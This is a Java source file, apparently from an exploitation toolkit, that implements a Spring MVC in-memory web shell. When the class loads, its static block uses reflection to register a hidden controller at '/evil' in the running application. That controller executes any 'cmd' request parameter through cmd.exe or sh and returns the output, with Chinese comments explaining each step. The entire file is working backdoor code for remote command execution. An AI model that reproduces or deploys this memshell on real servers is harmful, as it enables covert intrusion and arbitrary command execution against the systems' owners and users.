package xyz.eki.marshalexp.memshell;

import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.util.pattern.PathPatternParser;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;
import java.util.Scanner;

public class MSpringController2 {
    static {
        String inject_uri = "/evil";
        try{
            System.out.println("Controller Injecting");
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.
                    currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            //Method method = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping").getDeclaredMethod("getMappingRegistry");
            //method.setAccessible(true);

            Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
            f.setAccessible(true);
            Object mappingRegistry = f.get(mappingHandlerMapping);

            Class<?> c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");

            //Method[] ms = c.getDeclaredMethods();

            Field field = null;
            try {
                field = c.getDeclaredField("urlLookup");
                field.setAccessible(true);
            }catch (NoSuchFieldException e){
                field = c.getDeclaredField("pathLookup");
                field.setAccessible(true);
            }

            Map<String, Object> urlLookup = (Map<String, Object>) field.get(mappingRegistry);
            for (String urlPath : urlLookup.keySet()) {
                if (inject_uri.equals(urlPath)) {
                    throw new RuntimeException();
                }
            }

            Class <?> evilClass = MSpringController2.class;

            Method method2 = evilClass.getMethod("index");
//             定义该controller的path
            PatternsRequestCondition url = new PatternsRequestCondition(inject_uri);
//             定义允许访问的HTTP方法
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
//             构造注册信息
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);

            RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration();
            option.setPatternParser(new PathPatternParser());

//            RequestMappingInfo info = RequestMappingInfo.paths(inject_uri).options(option).build();

            // 将该controller注册到Spring容器
            mappingHandlerMapping.registerMapping(info, evilClass.newInstance(), method2);
            System.out.println("Controller Injected");
        }catch (Exception e){

        }
    }


    @ResponseBody
    public void index() throws IOException {
        // 获取请求
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        // 获取请求的参数cmd并执行
        // 类似于PHP的system($_GET["cmd"])
        try{
            String cmd = request.getParameter("cmd");
            if (cmd != null && cmd.length() > 0) {
                String osTyp = System.getProperty("os.name");
                InputStream in = Runtime.getRuntime().exec((osTyp != null && osTyp.toLowerCase().contains("win")) ? new String[]{"cmd.exe", "/c", request.getParameter("cmd")}:new String[]{"sh", "-c", request.getParameter("cmd")}).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }
            return;
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
